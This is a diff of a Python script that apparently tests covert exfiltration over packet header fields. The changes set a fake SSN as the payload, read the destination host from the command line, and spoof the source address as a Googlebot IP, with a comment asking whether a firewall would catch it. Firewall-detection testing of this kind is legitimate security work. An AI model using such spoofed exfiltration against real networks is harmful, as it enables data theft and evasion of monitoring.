@@ -68,22 +68,27 @@ multiplier = 16777216  # the server will be performing the division
 
 # An example sending a SSN, with the hyphens to make it look like a SSN. A
 # smooth criminal may try to obfuscate the SSN.
-message = '111-22-3333 from ' + thishost + '\n'
+# TEST: will a firewall detect this? should it?
+#message = '111-22-3333 from ' + thishost + '\n'
+message = 'foo bar 111-22-3333'
 # Clear before each use. Used by initial sequence numbers and IP ID tests
 exfilArray = []
 
 # Get destination from the command-line.
-#destination = str(sys.argv[1])
-#print '[+] destination: ' + destination
+destination = str(sys.argv[1])
+
 # Hard-code destination
-destination = '192.168.1.12'
+# TODO we should consider using a config for this and other testable things
+#destination = '192.168.12'
+
+print '[+] destination: ' + destination
 
 # When using a bounce host, the bounce host will be the destination,
 # the source host will be our server.
 bounce = ''
 # Spoof our source
-#spoof = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
-spoof = '8.8.8.8'
+spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
+#spoof = '8.8.8.8'     # google-public-dns-a.google.com
 # Get our real ip. This is especially useful in NAT'd environments.
 interfaces = netifaces.interfaces()
 
